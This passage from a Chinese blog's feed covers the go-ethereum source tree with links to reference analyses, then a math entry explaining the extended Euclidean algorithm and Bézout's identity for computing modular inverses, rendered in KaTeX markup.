rangeproof</span><br><span class="line">│   │   │   ├── corpus</span><br><span class="line">│   │   │   └── debug</span><br><span class="line">│   │   ├── rlp</span><br><span class="line">│   │   │   └── corpus</span><br><span class="line">│   │   ├── runtime</span><br><span class="line">│   │   ├── secp256k1</span><br><span class="line">│   │   ├── stacktrie</span><br><span class="line">│   │   │   └── debug</span><br><span class="line">│   │   ├── trie</span><br><span class="line">│   │   │   └── corpus</span><br><span class="line">│   │   ├── txfetcher</span><br><span class="line">│   │   │   └── corpus</span><br><span class="line">│   │   └── vflux</span><br><span class="line">│   │       └── debug</span><br><span class="line">│   ├── solidity</span><br><span class="line">│   │   ├── contracts</span><br><span class="line">│   │   ├── migrations</span><br><span class="line">│   │   └── test</span><br><span class="line">│   └── testdata</span><br><span class="line">└── trie<span class="comment">//区块的重要数据结构 MPT</span></span><br></pre></td></tr></table></figure><h1>底层源码参考</h1><ul><li><p><a href="https://www.jianshu.com/u/572268941378">简书博客</a>，最初发表的文章主要是以太坊源码分析，对以太坊的函数做了说明。</p></li><li><p><a href="https://github.com/blockchainGuide/blockchainguide/tree/main/source_code_analysis/ethereum/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">最近的源码分析文章</a></p></li><li><p><a href="https://github.com/ZtesoftCS/go-ethereum-code-analysis">GitHub - ZtesoftCS/go-ethereum-code-analysis</a> 4 年前的源码分析汇总</p></li><li><p><a href="https://github.com/Billy1900/Ethereum-tutorial">Ethereum-tutorial</a></p></li><li><p>[go-ethereum 源码笔记（概览）](<a href="https://knarfeh.com/2018/03/10/go-ethereum">https://knarfeh.com/2018/03/10/go-ethereum</a> 源码笔记（概览）/) 四年前的博客</p></li><li><p><a href="https://goethereumbook.org/zh/">Introduction · Ethereum Development with Go</a> 跟着用 Go 写简单区块链</p></li><li><p><a href="https://geth.ethereum.org/docs/">Geth Documentation | Go Ethereum</a> geth 使用说明，调试程序，使用自带工具的参考。</p></li><li><p><a href="https://www.evm.codes/">操作码详解和模拟</a>。</p></li><li><p><a href="https://learnblockchain.cn/books/geth/">以太坊技术与实现</a>，作者作了整体性的说明，适合作为大致参考。</p></li><li><p><a href="https://github.com/learnerLj/geth-analyze">笔者的源码分析和理论基础、调试实操</a>。</p></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>乘法逆元</title>
    <link href="https://www.blog-blockchain.xyz/cs-courses/modular-inverses/"/>
    <id>https://www.blog-blockchain.xyz/cs-courses/modular-inverses/</id>
    <published>2022-09-27T13:49:22.000Z</published>
    <updated>2024-11-15T14:30:54.919Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/cs-courses/C-language-basis/" title="C语言基础">C语言基础</a></li><li><a href="/cs-courses/modular-inverses/" title="乘法逆元">乘法逆元</a></li><li><a href="/cs-courses/cpp-cryptographic-algorithm-basis/" title="信息安全算法基础">信息安全算法基础</a></li><li><a href="/cs-courses/OS/" title="操作系统基础">操作系统基础</a></li><li><a href="/cs-courses/x86-masm/" title="x86汇编基础">x86汇编基础</a></li><li><a href="/cs-courses/information-theory/" title="信息论与编码">信息论与编码</a></li></ol></blockquote><h1>辗转相除法</h1><p>先温习辗转相除法和裴蜀等式：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mi>x</mi><mo>+</mo><mi>a</mi><mi>y</mi><mtext> </mtext><mtext> </mtext><mo>=</mo><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mi>a</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mi>x</mi><mo>+</mo><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mi>y</mi><mtext> </mtext><mtext> </mtext><mo>=</mo><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mi>x</mi><mo>+</mo><mrow><mo fence="true">(</mo><mi>a</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mi>y</mi><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}ax+by=\mathrm{gcd}\left( a,b \right)\\\left( b\,\,\mathrm{mod}\ a \right) x+ay\,\,=\,\,\mathrm{gcd}\left( a,b \right)\\\left( a\,\,\mathrm{mod} \left( b\,\,\mathrm{mod} \ a \right) \right) x+\left( b\,\,\mathrm{mod}\ a \right) y\,\,=\,\,\mathrm{gcd}\left( a,b \right)\\\left( \left( b\,\,\mathrm{mod}\ a \right) \,\,\mathrm{mod} \left( a\,\,\mathrm{mod} \left( b\,\,\mathrm{mod} \ a \right) \right) \right) x+\left( a\,\,\mathrm{mod} \left( b\,\,\mathrm{mod} \ a \right) \right) y=\mathrm{gcd}\left( a,b \right)\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.76em;vertical-align:-2.63em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-1.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.592em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewBox="0 0 888.89 916" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewBox="0 0 888.89 916" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-5.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.13em;"><span style="top:-5.13em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-0.81em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>为什么右边都等于 gcd(a,b) 呢，因为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mi>k</mi><mo>+</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathrm{gcd}\left( b\,\,\mathrm{mod} \ a, a \right) =\mathrm{gcd}\left( ak+r,a \right) =\mathrm{gcd}\left( r,a \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">ak</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 相同时，k 取任何整数都是成立的。</p><p>上面的过程本质上就是两个数 a, b，开始互相迭代</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo mathvariant="normal">′</mo><mo>=</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo mathvariant="normal">′</mo><mo>=</mo><mi>a</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\left\{ \begin{array}{c}a\prime=b\,\,\mathrm{mod} \ a\\b\prime=a\\\end{array} \right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>而这样迭代的结果必然会出现下面的情况：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>y</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}x=0\\y=1\\a=0\\b=\mathrm{gcd}\left( a,b \right)\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.76em;vertical-align:-2.63em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-1.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.592em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewBox="0 0 888.89 916" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewBox="0 0 888.89 916" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-5.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.13em;"><span style="top:-5.13em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span><span style="top:-0.81em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>需要注意，每次迭代后 x, y 的值都不同了。</p><p>以上都是辗转相除法的内容，也就是得到最大公因数的过程。但是之前的关注点在于如何得到最后的 a 或者 b，但是现在的关注点在于 x, y 如何得到。我们知道最终迭代的结果可以得到 x, y 的值，那么我们只需要回溯就可以了。</p><p><strong>当 a, b 置换，上面的式子也可以写成对称的形式。</strong></p><h1>回溯</h1><p>如何回溯呢，可以通过引用机制，也就是传入指针或者引用，这样伴随着函数的返回，值也修改了。具体修改的规则怎么确定呢？这就需要一点儿数学知识了，对于：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math 